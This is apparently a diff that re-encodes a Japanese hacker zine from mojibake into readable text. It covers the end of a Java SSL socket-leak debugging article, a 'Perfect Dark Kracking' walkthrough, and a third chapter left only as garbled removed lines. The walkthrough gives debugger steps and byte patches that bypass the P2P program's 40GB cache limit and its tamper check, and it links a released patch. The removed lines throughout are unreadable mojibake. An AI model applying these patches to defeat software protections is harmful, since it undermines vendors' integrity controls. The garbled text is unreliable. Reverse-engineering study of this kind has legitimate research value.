-mpl��SSLServerSocketImpl����ςȕ��ɌĂяo����Ă���A���̂Ƃ�sockOutput
-�́i�C���X�^���X�̎����́j�ŏ�����Ō�܂�NULL�̂܂܂Ȃ̂ł���B�Ăяo��
-��Ă���ӏ��͈ȉ��̂Ƃ��肾�B
+　このstackTraceデバッグにより、無事に原因が解明された。なんとSSLSocketI
+mplはSSLServerSocketImplから変な風に呼び出されており、このときsockOutput
+は（インスタンスの寿命の）最初から最後までNULLのままなのである。呼び出さ
+れている箇所は以下のとおりだ。
 
 -----
             SSLSocketImpl tmp = new SSLSocketImpl(sslContext, useServerMode,
@@ -441,226 +441,226 @@ mpl��SSLServerSocketImpl����ςȕ��ɌĂяo����Ă���A���̂Ƃ�sockOutput
             ServerHandshaker handshaker = tmp.getServerHandshaker();
 -----
 
-�@����tmp�ݽ�ݽ��ServerHandshaker�N���X�̃C���X�^���X�𓾂邽�߂����ɗ��p
-����Ă���A���ۂ�SSL�ʐM���s��Ȃ��B�ŏ�����Ō�܂�sockOutput��NULL�ł�
-��ɂ�������炸�AGC�̍ۂɌĂяo�����close�̒��ɂ�����sockOutput�𗘗p��
-�悤�Ƃ��Ă��܂��Ă����̂ł���B
+　このtmpインスタンスはServerHandshakerクラスのインスタンスを得るためだけに利用
+されており、実際のSSL通信を行わない。最初から最後までsockOutputはNULLであ
+るにもかかわらず、GCの際に呼び出されるcloseの中においてsockOutputを利用し
+ようとしてしまっていたのである。
 
-�@SSLServerSocket�𗘗p����Ƃ��ɂ͕K�����̺��ނ����s����邽�߁A�Ⴆ��T
-omcat�Ȃǂ�SSL���Ă��g���Ă���ꍇ�ɂ͕K��1�̿��Ă�ذ����Ă���͂����B
-lsof����ނ��g����can't identify protocol�ȏ�Ԃ̿��Ă������邱�Ƃ��ł�
-�邾�낤�B
-�@�������������ʂ̱��ع���݂ł�SSLServerSocket�̲ݽ�ݽ��1�ōςށi���Ƃ�
-��443���߰Ă��J���邾���j���߁Aذ�����̧���ި�������͂�����1�ł���A��
-���ケ��͖��ɂ͂Ȃ�Ȃ��B
+　SSLServerSocketを利用するときには必ずこのコードが実行されるため、例えばT
+omcatなどでSSLソケットを使っている場合には必ず1つのソケットがリークしているはずだ。
+lsofコマンドを使えばcan't identify protocolな状態のソケットを見つけることができ
+るだろう。
+　しかしごく普通のアプリケーションではSSLServerSocketのインスタンスは1つで済む（たとえ
+ば443番ポートを開けるだけ）ため、リークするファイルディスクリプタはたった1つであり、事
+実上これは問題にはならない。
 
-�@�ȏ�����[�����OؽĂɕ񍐂����Ƃ���A�����Ή������҂ł�������ڽ��ݽ��
-�邱�Ƃ��ł����B�{�e���M���_�ł͂܂������ްĂ͍s���Ă��Ȃ����A�x���Ƃ�
-��������ɂ͑Ή����s���邱�Ƃ��낤�B
-
-
-��0x09.) �܂Ƃ�
-
-�@���č���͌l�I�ɑ厖��������̧���ި������ذ��������ނ�Java�f�o�b�M
-���O�̗l�q�����Ă݂��B�܂Ƃ߂͈ȉ��̂悤�ɂȂ�B
-
-�Estrace��-ff�I�v�V�����ɂ��e�X���b�h���g���[�X����ƕ֗���
-�Ejava��-Xrunhprof�ł�depth�ɑ傫�Ȑ����w�肷��̂��K�{�e�N
-�Ejava�̃g���[�X���������ςȗ�O���������Ă��Ȃ����T���Ƃ������Ƃ���J��
-�Ejava��printf�f�o�b�O���s���ۂɂ͗�O��new���Ă��̏��printStackTrace����
-�ƕ֗������Ď��ւ���
-
-�@���ɂ��֗��ȃf�o�b�O�Z���������琥�񋳂��Ă��������I
+　以上をメーリングリストに報告したところ、無事対応が期待できそうなレスポンスを得
+ることができた。本稿執筆時点ではまだアップデートは行われていないが、遅くとも
+数ヶ月後には対応が行われることだろう。
 
 
+■0x09.) まとめ
 
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+　さて今回は個人的に大事件だったファイルディスクリプタリーク事件を題材にJavaデバッギ
+ングの様子を見てみた。まとめは以下のようになる。
 
---- ��2��: Perfect Dark Kracking ---
+・straceで-ffオプションにより各スレッドをトレースすると便利杉
+・javaの-Xrunhprofではdepthに大きな数を指定するのが必須テク
+・javaのトレースを取ったら変な例外が発生していないか探すといいことあるカモ
+・javaのprintfデバッグを行う際には例外をnewしてその場でprintStackTraceする
+と便利すぎて失禁しる
 
-���ҁFWill
+　他にも便利なデバッグ技があったら是非教えてくだきい！
+
+
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
+--- 第2章: Perfect Dark Kracking ---
 
-��0x01.) �͂��߂�
+著者：Will
 
-�@Perfect Dark�Ƃ�
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
------�@http://ja.wikipedia.org/wiki/Perfect_Dark������p
-�@Perfect dark��Windows�œ��삷�铽���t�@�C�����L�\�t�g�ł���B��Ɩ���
-�铽���̍�҂ɂ���ĊJ�����ł���A�ŏI�I�ɂ�Winny��Share�̌�p�ƂȂ肤��
-���̂�ڎw���Ă���BPD�Ɨ�����邱�Ƃ������B ���݁A���J�e�X�g���ł���B
+
+■0x01.) はじめに
+
+　Perfect Darkとは
+
+-----　http://ja.wikipedia.org/wiki/Perfect_Darkから引用
+　Perfect darkはWindowsで動作する匿名ファイル共有ソフトである。会長と名乗
+る匿名の作者によって開発中であり、最終的にはWinnyやShareの後継となりうる
+ものを目指している。PDと略されることも多い。 現在、公開テスト中である。
 -----
 
-�@���̃\�t�g�E�F�A�ɂ̓t�@�C�����L�@�\�����łȂ��t���[��{�[�h�Ƃ�������
-�����ɗD�ꂽ�ȈՌf���@�\������󂾂��A���Ƃ��t���[��{�[�h���g���ړI��
-Perfect Dark�𓱓�����ɂ��Ă��AUnity(�L���b�V��)�t�H���_�Ƃ��čŒ�ł�H
-DD�̋󂫗e�ʂ�40GB�͕K�v�ł���B
-�@�Ƃ����킯�ŁA���s�t�@�C���̉��ςɂ���Ă���40GB�������������悤�Ƃ���
-�̂�����̉�̖͂ړI�ł���B
-�@�Ȃ��A�p�b�`�̈�@�ړI�ł̎g�p�͂��������������B
+　このソフトウェアにはファイル共有機能だけでなくフローやボードといった匿
+名性に優れた簡易掲示板機能がある訳だが、たとえフローやボードを使う目的で
+Perfect Darkを導入するにしても、Unity(キャッシュ)フォルダとして最低でもH
+DDの空き容量が40GBは必要である。
+　というわけで、実行ファイルの改変によってこの40GB制限を解除しようという
+のが今回の解析の目的である。
+　なお、パッチの違法目的での使用はご遠慮ください。
 
 
-��0x02.) ����
+■0x02.) 準備
 
-�@����̉�͂Ŏg�p����\�t�g�E�F�A�͈ȉ��̒ʂ�ł��B
+　今回の解析で使用するソフトウェアは以下の通りです。
 
-�EOllyDbg
-�EIDA Pro 4.9 Freeware
-�E�����݂݃n���P�[��
-�EPerfect Dark 1.02�i�^�[�Q�b�g�j
+・OllyDbg
+・IDA Pro 4.9 Freeware
+・うさみみハリケーン
+・Perfect Dark 1.02（ターゲット）
 
 
-��0x03.) 40GB������������悤
+■0x03.) 40GB制限を回避しよう
 
-�@����ł̓e���|�ǂ���͂��Ă����܂��傤�B
+　それではテンポ良く解析していきましょう。
 
-1�FUnity�T�C�Y��ێ����Ă���ϐ��̃A�h���X��T�����B
+1：Unityサイズを保持している変数のアドレスを探そう。
 
-�@�܂���OllyDbg��perfect dark.exe���J���A���s�����܂��B
-�@���ɂ����݂݃n���P�[�������s���A���s����perfect dark.exe�ɃA�^�b�`����
-���BVista�̏ꍇ�͂ǂ���̃\�t�g�E�F�A���Ǘ��Ҍ����Ŏ��s���Ȃ��Ɛ���ȓ���
-�����Ȃ��̂Œ��ӂ��Ă��������B
-�@�����ă��j���[�o�[�́u�����v���u�������͈͂��w�肵�Č����v�������܂��B
-�ʏ팟���Ƃ������ڂ�����̂Łu���l�v�̉E�ɂ���e�L�X�g�{�b�N�X�ɍ����݂�
-Unity�̃T�C�Y����͂��A�u�ʏ팟�����s�v�Ƃ����{�^���������ƉE��̃��X�g�{
-�b�N�X�Ɍ������ʂ��\������܂��B
-�@���̂܂܂ł͌�₪��������̂�Perfect Dark�𑀍삵��Unity�̃T�C�Y��ύX
-���A�Ăт��̒l���e�L�X�g�{�b�N�X�ɓ��͂��Č����A�Ƃ����̂��J��Ԃ��Č��
-����ɂȂ�܂ŌJ��Ԃ��܂��B
-�@������c�����̂������݂�Unity�̑傫����ێ����Ă���A�h���X�ł��B����
-���Ă��������B
-�@����ł͂����݂݃n���P�[�����I�����āA����OllyDbg�̕��ō�Ƃ𑱂��܂��B
+　まずはOllyDbgでperfect dark.exeを開き、実行させます。
+　次にうさみみハリケーンを実行し、実行中のperfect dark.exeにアタッチしま
+す。Vistaの場合はどちらのソフトウェアも管理者権限で実行しないと正常な動作
+をしないので注意してください。
+　そしてメニューバーの「検索」→「メモリ範囲を指定して検索」を押します。
+通常検索という項目があるので「数値」の右にあるテキストボックスに今現在の
+Unityのサイズを入力し、「通常検索実行」というボタンを押すと右上のリストボ
+ックスに検索結果が表示されます。
+　このままでは候補が多すぎるのでPerfect Darkを操作してUnityのサイズを変更
+し、再びその値をテキストボックスに入力して検索、というのを繰り返して候補
+が一つになるまで繰り返します。
+　一つだけ残ったのが今現在のUnityの大きさを保持しているアドレスです。メモ
+してください。
+　それではうさみみハリケーンを終了して、次にOllyDbgの方で作業を続けます。
 
-2�FUnity�T�C�Y��ێ����Ă���ϐ��ɃA�N�Z�X���Ă���ӏ���T�����B
+2：Unityサイズを保持している変数にアクセスしている箇所を探そう。
 
-�@OllyDbg�̍�����Dump��ʓ��ŉE�N���b�N���u�ړ��v���u�A�h���X�ړ��v������
-�Đ�قǃ��������A�h���X����͂��܂��B����ƍ����݂�Unity�T�C�Y�̒l��16�i
-���ŕ\������Ă���̂��m�F�ł���Ǝv���܂��B
-�@���ɁA�����ɃA�N�Z�X���Ă���ӏ���T�����߂Ƀu���[�N�|�C���g���Z�b�g��
-�܂��B�l�̏�ŉE�N���b�N���u�u���[�N�|�C���g�v���uHW�u���[�N�|�C���g����
-���݁v���ubyte�v�������ƃn�[�h�E�F�A�u���[�N�|�C���g���Z�b�g����܂��B
-�@������Perfect Dark�̕��ōĂ�Unity�T�C�Y��ύX���AOk�������ƈȉ��̏ꏊ��
-�u���[�N���܂��B
+　OllyDbgの左下のDump画面内で右クリック→「移動」→「アドレス移動」を押し
+て先ほどメモしたアドレスを入力します。すると今現在のUnityサイズの値が16進
+数で表示されているのが確認できると思います。
+　次に、ここにアクセスしている箇所を探すためにブレークポイントをセットし
+ます。値の上で右クリック→「ブレークポイント」→「HWブレークポイント書き
+込み」→「byte」を押すとハードウェアブレークポイントがセットされます。
+　そしてPerfect Darkの方で再びUnityサイズを変更し、Okを押すと以下の場所で
+ブレークします。
 
 -----
 0040DF5B   .  E8 90E4FFFF   CALL perfect_.0040C3F0
 -----
 
-�@�������A�n�[�h�E�F�A�u���[�N�|�C���g�͈�s���߂���Ƃ��������������
-�ŁA���ۂɂ͈ȉ��̖��߂���قǂ̃A�h���X�ɃA�N�Z�X���Ă��܂��B
+　しかし、ハードウェアブレークポイントは一つ行き過ぎるという特徴があるの
+で、実際には以下の命令が先ほどのアドレスにアクセスしています。
 
 -----
 0040DF55   .  8981 78020000 MOV DWORD PTR DS:[ECX+278],EAX
 -----
 
-�@�Ƃ肠�����n�[�h�E�F�A�u���[�N�|�C���g����������0x0040DF55�Ƀu���[�N�|
-�C���g���Z�b�g���Ă�����x�������Ɠ��l��Unity�T�C�Y��ύX�����0x0040DF55
-�Ńu���[�N���܂��B���̂Ƃ���EAX�̒l���ύX����l�ŁADS:[ECX+278]���ύX�O��
-�l�ł���̂��m�F�ł���Ǝv���܂��B�܂�A����EAX���`�F�b�N���Ă���ӏ���
-�T�����Ƃ�40GB����������ł���킯�ł��B
-�@�ƌ����킯�ŁA���̏�����̃R�[�h�����Ă݂܂��傤�BMessageBox���Ăяo��
-�Ă���ӏ�������̂������Ɍ�����Ǝv���܂��B���ꂪ�ݒ肵���l��40GB����
-�̏ꍇ�ɃG���[�Ƃ��ĕ\���������̂��ƌ������Ƃ͗e�Ղɑz�������ł��傤�B
-�Ƃ������Ƃ͂��̏������O�̔�r�Ń`�F�b�N���Ă���Ƃ����̂�������܂��B
-���ꂪ�ȉ��̖��߂ł��B
+　とりあえずハードウェアブレークポイントを解除して0x0040DF55にブレークポ
+イントをセットしてもう一度さっきと同様にUnityサイズを変更すると0x0040DF55
+でブレークします。このときのEAXの値が変更する値で、DS:[ECX+278]が変更前の
+値であるのが確認できると思います。つまり、このEAXをチェックしている箇所を
+探すことで40GB制限を回避できるわけです。
+　と言うわけで、その少し上のコードを見てみましょう。MessageBoxを呼び出し
+ている箇所があるのかすぐに見つかると思います。これが設定した値が40GB未満
+の場合にエラーとして表示されるものだと言うことは容易に想像がつくでしょう。
+ということはこの処理より前の比較でチェックしているというのも分かります。
+それが以下の命令です。
 
 -----
 0040DEE6   .  3BC6          CMP EAX,ESI
 -----
 
-�@�Ƃ����킯�ŁA���̉��̍��ڂ��ȉ��̂悤�ɕύX���܂��B
+　というわけで、その下の項目を以下のように変更します。
 
 -------
 0040DEE8   . /EB 5E         JMP SHORT perfect_.0040DF48
 -------
 
-�@�u���[�N�|�C���g���O���Ă���ĊJ�����āAUnity�T�C�Y��40GB�ȉ��ɂ��Ă��G
-���[���o���ɒl���X�V����Ă���̂��m�F�ł���ł��傤�B
-�@�Ō�ɕύX�����s�t�@�C���ɏ������݁A��͏I���ł��B�����l�ł����B�Ƃ�
-��������ł����ˁB
+　ブレークポイントを外してから再開させて、Unityサイズを40GB以下にしてもエ
+ラーが出ずに値が更新されているのが確認できるでしょう。
+　最後に変更を実行ファイルに書き込み、解析終了です。お疲れ様でした。とい
+いたいんですがね。
 
 
-��0x04.) ���σ`�F�b�N��������悤
+■0x04.) 改変チェックを回避しよう
 
-�@�Ƃ����킯�ŁA�ύX�������s�t�@�C�������s���Ă������ɏI�����܂��B�܂�
-���σ`�F�b�N�����݂���Ƃ������ł��B
-�@����ł̓T�N���Ɖ�������Ⴂ�܂��傤�B
-�@�܂���IDA Pro��perfect dark.exe���J���܂��B���͂��I������܂Ŏb���҂���
-���傤�B���s���Ă��E�C���h�E���\������Ȃ��̂ŁA�����炠���肩��U�߂Ă�
-���܂��BImport�E�C���h�E�̒���CreateWindowEX�̍��ڂ��_�u���N���b�N������
-��
+　というわけで、変更した実行ファイルを実行してもすぐに終了します。つまり
+改変チェックが存在するという事です。
+　それではサクっと回避しちゃいましょう。
+　まずはIDA Proでperfect dark.exeを開きます。分析が終了するまで暫く待ちま
+しょう。実行してもウインドウが表示されないので、そこらあたりから攻めてい
+きます。Importウインドウの中のCreateWindowEXの項目をダブルクリックをする
+と
 
 -----
-idata:004CE3D8�@�c
+idata:004CE3D8　…
 -----
 
-�@�Ƃ����Ƃ���Ɉړ����܂��BCreateWindowEX�̂Ƃ���ŉE�N���b�N���ujump to
- xref to operand�v�������Ƒ����̍��ڂ��\������܂����A����̈�ԏ���_�u
-���N���b�N���܂��B����̃R�[�h������Ƃ��������C���̃E�C���h�E���쐬����
-����ӏ��ł���̂��m�F�ł���Ǝv���܂��B
-�@����ł͎��Ƀ��j���[�o�[�uView�v���ugraph�v���uFlow chart�v�������܂��B
-����ƍ��̉ӏ����܂߂��t���[�`���[�g���\������܂��B�������炪�ʓ|�Ȃ̂�
-�����A���ϑO�Ɖ��ό�̎��s�t�@�C�������̃t���[�`���[�g�����Ȃ���f�o�b�O
-���Ă����܂��B
-�@�����āA�ǂ��ňႢ�������邩���`�F�b�N���܂��B���ʂ͈ȉ��̉ӏ��ŁA����
-��̏ꍇ�́A�W�����v���Ă��܂��܂��B
+　というところに移動します。CreateWindowEXのところで右クリック→「jump to
+ xref to operand」を押すと多くの項目が表示されますが、これの一番上をダブ
+ルクリックします。周りのコードを見るとここがメインのウインドウを作成して
+いる箇所であるのが確認できると思います。
+　それでは次にメニューバー「View」→「graph」→「Flow chart」を押します。
+すると今の箇所を含めたフローチャートが表示されます。ここからが面倒なので
+すが、改変前と改変後の実行ファイルをこのフローチャートを見ながらデバッグ
+していきます。
+　そして、どこで違いが生じるかをチェックします。結果は以下の箇所で、改変
+後の場合は、ジャンプしてしまいます。
 
 -----
 text:0040A1B0                 jnz     loc_40A3FB
 -----
 
-�Ƃ����킯�ŁA�����ɂ�����΂Ȃ��悤�ɕύX���Ď��s����ƁA�Ȃ����\�t
-�g�������܂��B
-�@���傤���Ȃ��̂ł��̑O��
+というわけで、試しにこれを飛ばないように変更して実行すると、なぜかソフ
+トが落ちます。
+　しょうがないのでその前の
 
 -----
 .text:0040A1A6                 call    sub_40AA20
 -----
 
-�@���̒����`�F�b�N���邱�Ƃɂ��܂��B�����ł��t���[�`���[�g��\�������Ă�
-��A���ϑO�Ɖ��ό�̎��s�t�@�C���̈Ⴂ���`�F�b�N���Ă����܂��B���ʂ͈ȉ�
-�̉ӏ��ŁA���ό�̏ꍇ�́A�W�����v���܂���B
+　この中もチェックすることにします。ここでもフローチャートを表示させてか
+ら、改変前と改変後の実行ファイルの違いをチェックしていきます。結果は以下
+の箇所で、改変後の場合は、ジャンプしません。
 
 -----
 text:0040AB6A                 jz      short loc_40ABCA
 -----
 
-�@�Ƃ����킯�ŁA���̑O��
+　というわけで、その前の
 
 -----
 .text:0040AB63                 call    sub_4628B0
 -----
 
-���̒�������ɒ��ׂ܂��BCreateFileW��ReadFile�֐��Ȃǂ��g���ĉ��σ`�F�b�N
-�����Ă���̂�������Ǝv���܂��B
-�@�Ƃ����킯�ňȉ��̂悤�ɕύX���邱�Ƃŉ��σ`�F�b�N��������܂��B
+この中をさらに調べます。CreateFileWやReadFile関数などを使って改変チェック
+をしているのが分かると思います。
+　というわけで以下のように変更することで改変チェックを回避します。
 
 -----
 .text:0040AB68                 cmp    eax, eax
 -----
 
-�@����Ɖ��ό�̎��s�t�@�C���ł����s�ł���悤�ɂȂ�܂����B
-�@�����l�ł����B�Ƃ���������ł����ˁB
+　すると改変後の実行ファイルでも実行できるようになりました。
+　お疲れ様でした。といいたいんですがね。
 
 
-��0x05.)�@�N������Unity�T�C�Y��ݒ肳����
+■0x05.)　起動時にUnityサイズを設定させる
 
-�@���s���Ă�������番�����ł����A�N������Unity�T�C�Y��40GB�ŕύX�����
-40GB�ȉ��ɂȂ�܂��B����͂�����Ɓc���Ċ����ł��B
-�@�Ƃ����킯�œK���ȂƂ����Unity�T�C�Y��ݒ肷��R�[�h���쐬���܂��B���
-�������A���σ`�F�b�N��ɓ���Ă݂܂����B�܂��͈ȉ��̂悤�ɕύX���āA��
-�Ă�ꏊ�܂ŃW�����v�����܂��B
+　実行してもらったら分かるんですが、起動時のUnityサイズは40GBで変更すると
+40GB以下になります。これはちょっと…って感じです。
+　というわけで適当なところにUnityサイズを設定するコードを作成します。取り
+敢えず、改変チェック後に入れてみました。まずは以下のように変更して、空い
+てる場所までジャンプさせます。
 
 -----
 0040AD6A   . /E9 BC120C00   JMP perfect_.004CC02B
 -----
 
-�@�����āA�ύX�ɂ���ĂԂꂽ���߂�Unity�T�C�Y��ݒ肷��R�[�h����������
-�܂��B��芸�����A�ݒ肷��T�C�Y��7GB�ɂ��Ă݂܂����B
+　そして、変更によってつぶれた命令とUnityサイズを設定するコードを書き加え
+ます。取り敢えず、設定するサイズは7GBにしてみました。
 
 -----
 004CC02B    64:890D 0000000>MOV DWORD PTR FS:[0],ECX
@@ -670,23 +670,23 @@ text:0040AB6A                 jz      short loc_40ABCA
 004CC043  ^ E9 29EDF3FF     JMP perfect_.0040AD71
 -----
 
-�@���s������Ɗm���ɃT�C�Y��7GB�ɂȂ��Ă���̂��m�F�ł���ł��傤�B��͂�
-����O������ύX����\�t�g�����ΏI���ł��B����̃p�b�`���ύX�\�t�g��
-���̃T�C�g�Ō��J���Ă��܂��B
+　実行させると確かにサイズが7GBになっているのが確認できるでしょう。後はこ
+れを外部から変更するソフトを作れば終わりです。今回のパッチ＆変更ソフトは
+私のサイトで公開しています。
 
 http://security.symphonic-net.com/?page_id=6
 
-�@�����l�ł����B
+　お疲れ様でした。
 
 
-��0x06.) ��������
+■0x06.) さいごに
 
-�@����̉�͂ł�40GB�����Ɖ��σ`�F�b�N�̉�����s���܂������A���ɂ��F�X��
-�������Ƃ���͂���Ǝv���̂ŁA����������͑��ɂ���͂��Ă݂�̂�������
-������܂���B�撣���Ă��������B
-�@��芸�������σ`�F�b�N�͉�����Ă���̂ŉ�͂��₷�����Ǝv���܂��B����
-�����ł͂�����ƕ�����ɂ����Ǝv���̂ŁA����摜���܂߂����̂������̃T�C
-�g���Ō��J���悤�Ǝv���܂��B�ł͂ł́B
+　今回の解析では40GB制限と改変チェックの回避を行いましたが、他にも色々と
+いじれるところはあると思うので、興味ある方は他にも解析してみるのもいいか
+もしれません。頑張ってください。
+　取り敢えず改変チェックは回避しているので解析しやすいかと思います。文章
+だけではちょっと分かりにくいと思うので、後日画像を含めたものをうちのサイ
+ト↓で公開しようと思います。ではでは。
 
 Security Ark
 http://security.symphonic-net.com/
@@ -696,156 +696,156 @@ http://security.symphonic-net.com/
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
---- ��3��: �V�����U�����ނ̂��� ---
+--- 第3章: 新聞勧誘員撃退のお呪い ---
 
-���ҁF������
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-
-
-��0x01.) �͂��߂�
-
-�@Guten Tag !
-�@Wie geht es Ihnen ?
-
-�@���傭���傭�AEPSILON�a Wizard Bible�Ō��e�����M�����Ă��������Ă����
-���A�@���@�l���A���������s�ψ���s����������Rudolph von Gartheimer�ł�
-�����܂��B���H�@���O�������H�@�ł��A�h�C�c�ꂾ�ƁADer vollstreckende Vor
-sitzender des zentralen Exekutivkomitees�ɂȂ��Ă��܂��̂ł����ƒ����Ȃ�
-�܂��c�c�
-
-�@���āA����͐V���𖳗��œǂޕ��@���c�c�B
-�@���H�@�m���Ă�H
-
-�c�c�B
-
-�c�c���[�A���́B��������ƃl�^�������Ȃ���Łi�����j����̂ŁA�ǂ�ł��
-�Ă��������B���肢���܂��B���ł��ʗp����l�^�Ȃ̂ŁA����A�z���g�ɁB
-
-
-��0x02.) �V�����U�̎���
-
-�@�V���͊��Ɏ���x��̃��f�B�A�ɂȂ����A�w�ǂ��Ă��鐢�т���������
-����͗l�ł��B��ςȂ̂͐V�����U���̃I�W�T���B�B
-
-�@�Ȃɂ���m���}��B���ł��Ȃ��ƁA�ߎS�Ȃ��d�u�����҂��Ă���̂ł��B�O�p
-�ؔn�ɕڂ⃍�E�\�N�͊�{�A�ہA����ȏ�̋��|�̂��d�u�����c�c�B
-
-�@���āA�m���}��B�����Ȃ��Ƃ��d�u�����҂��Ă���I�W�T�������͂������
-�i�Ō_��𔗂��Ă��܂��B�䂪�Ƃ͊w���A�p�[�g�̈�p�ɕ��ꍞ��ł���̂ŁA
-�w����_�����V�����U���̃I�W�T�����䂪�Ƃ̃x�����E�b�J���炷�ƁA�n����
-���񂾂����R�ł��B�ȑO�A�@�����U�̐l�����܂������A�������@�̌��ւɂ͋��\
-�A�̊��������Ă���̂ŁA�ނ�̓h�A���J�����u�Ԃɖ����ŋ����Ă����܂����B
-�Ȃ��Ȃ��֗��ł����A���Y��`�҂ƌ������鋰�ꂪ����̂ŁA���ԑ̂��C�ɂ�
-��l�͎~�߂܂��傤�B
-
-�@���ɂ��򐅊�̊��U�����܂������A�䂪�Ƃ͗�ɂ���ăh�A���J�����u�ԁA��
-�����̎R������ł����A�����������u������̂ŁA���������ŋA���čs����
-�����B�����Ɩʔ������q�͂��Ȃ��̂ł��傤���A���^�N�V�͎₵���Ă���������
-�܂���B
-
-�@�b��߂��Ė{��ɓ���܂����A�V�����U�̃I�W�T���B�������ꍇ�͈ȉ��̎���
-�������邾���ŁA�ގU���Ă������A�V���������œǂ߂Ă��܂��܂��B
-
-�u�u�����Ȃ�ǂ��ł���B�v
-
-�@����ŃI�W�T�������͋A���Ă������A������u���Ă����ĐV���𖳗��œǂ߂�
-���ƂɂȂ�܂��B�ǂ����āA����Ȃ��Ƃ��\�Ȃ̂ł��傤���H
-
-�@�V���̌_��͑��A�O�����ňꖜ�~�O��ł����A�ꐢ�т�����̌_�񐬗���V
-���A�������͊��U�m���}��B�������ꍇ�́A�ꖜ�~�ȏ�̕�V���o�邽�߁i�m��
-�}��B������ƃ{�[�i�X���o��j�A�I�W�T���B�ɂƂ��Ă͌_�񐔂��C�m�`�Ȃ̂�
-���B
-�@�Ȃ̂ŁA�V���𖳗��œǂ߂郏�^�V���V�A���Z�A�I�W�T�����m���}��B���ł�
-�ăn�b�s�[���^�V���A�i�^���E���V�C�O���j���[�X�O���j���[�X���[�}���^�C�i
-���F�����j�Ȗ�Ȃ̂ł��B
-
-�@���A���͂��̌_����@�͓Ɛ�֎~�@��\����i�s�����Ȏ���̋֎~�j�ᔽ�A�i
-�i�\���@��O���i�i�i�ނ̐����y�ы֎~�j�ᔽ�A����Ɂu�V���Ƃɂ�����i�i��
-�̒񋟂Ɋւ��鎖���̐����v�i����12�N��������ψ������29���B�u�V���ƌi
-�i���������v�ƌĂԁj�ƐF�X�K������Ă���A�I�W�T�������͂��̎����o�����
-�����Ŏ�ɂȂ�܂��B
-
-�@�i�j�A�S�z�͗v��܂���A���������̂͊��U���̃I�W�T�������Ō_��҂ɂ�
-�����͂���܂���B�ܔN�ԁA�V�����^�_�œǂݑ����Ă��郏�^�V�������̂ł���
-��A�ԈႢ����܂���B
-
-�@�����A�����ňꉞ���ӂ��Ă��������̂́A�����ł͒u�����͐������Ȃ��̂ŕK
-���A�_�񏑂Ɂu�w�Ǘ��̎��ς݁v�Ɗ��U���̃I�W�T���Ɉ�M����Ă��炢�܂���
-���B���Ƃ͔̔��X����m�F�̓d�b���˂����Ă��܂����A�K���ɍς܂��܂��B
-
-�@���^�V�̏ꍇ�͌ォ�痈��W���̐l���ʓ|�Ȃ̂ŃI�W�T���ɑS��������C����
-����̂ŁA�W�������܂���B�����V���̌_�񏑂ɃT�C�����ăn���R�����āA��M
-�u�w�Ǘ��̎��ς݁v����Ă�����Ă���ŏI���ł��B
-
-�@���Ƃ̓I�W�T�������ܖႤ�Ȃ�A�r�[�����Ⴄ�Ȃ肵�܂��傤�B�����A���
-��r�[�����Ȃǂ̌i�i�͑S���I�W�T���B�̎����Ȃ̂ł���܂�~����Ȃ��悤�B
-�_�񂪐��藧���Ă��r�[�����Ȃǂ������Ă��Ȃ��Ɣ̔��X�̊č��Ɉ����������
-�����āA�r�[�����𖈉�u���Ă����^���ڐV���̃I�W�T�������܂����A�z���g
-�E�ɂ��̋ƊE�͐F�X�������͗l�ł��B
-
-�@���̒��q�Ń��^�V�͒��ڐV���ƓǉZ�V�����ܔN�ԁA�����Ō_�񂵂Ă܂��i�ŋ�
-�͖��ڂ��j�B�V���O�����Ƃ��Ă���Ɠǂނ̂���ςŎז��ł����i���ڂȂǂ̔�
-���V���͂��̂܂܃S�~���s�����������ł����j�B
-
-�@�V���͓ǂ܂Ȃ��̂ŁA���ɓ������ꂽ��A���̂܂܉䂪�A���������@�̃y�b�g
-�ŋً}���ɂ�����u���H�v�̃E�T�M�́u�����`�i�Y�j�v�̃g�C���̕~�ނɂȂ�
-�Ă܂��B��̓r���}�j�V�L�w�r�A�{�A�R���X�g���N�^�[���̑�ւ̕~�ނɂ��֗�
-�ł��B
-
-�@�g�C���b�g�y�[�p�[�ɂȂ�Ȃ��̂��s�ւł��ˁB����ł���ʂɂ����Ďז���
-�d���Ȃ��̂ŁA�Ɏ_�ŏɉ����Ă݂�Ɨǂ���������܂���B
-
-�@�܂��A�I�g�i�̎���ŏɉ����Ăǂ�����̂��͓ǎ҂̊F�l�̂��z���ɂ��C����
-�܂��B
-�@�V�����U�ł��񂴂肵�Ă�����A���ƒ�̌o�ϓI���S���������ł����炷����
-�o����Έ��A���̒��Ƃ��Ċ��������Ƃ͂���܂���B
-
-
-��0x03.) �Ō��
-
-�@�F�l���V�����U����������A�E�C�������āu�u�����v�ŁA�ƈꌾ�����Ă݂܂�
-�傤�B�K���ގU���邩�A�V�����^�_�œǂ߂Ă��܂��܂��B
-
-�@���񂨂��߂�����B
-
-�@����ł�Auf Wiedersehen!�I Sieg Heil!!
-
-
-
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
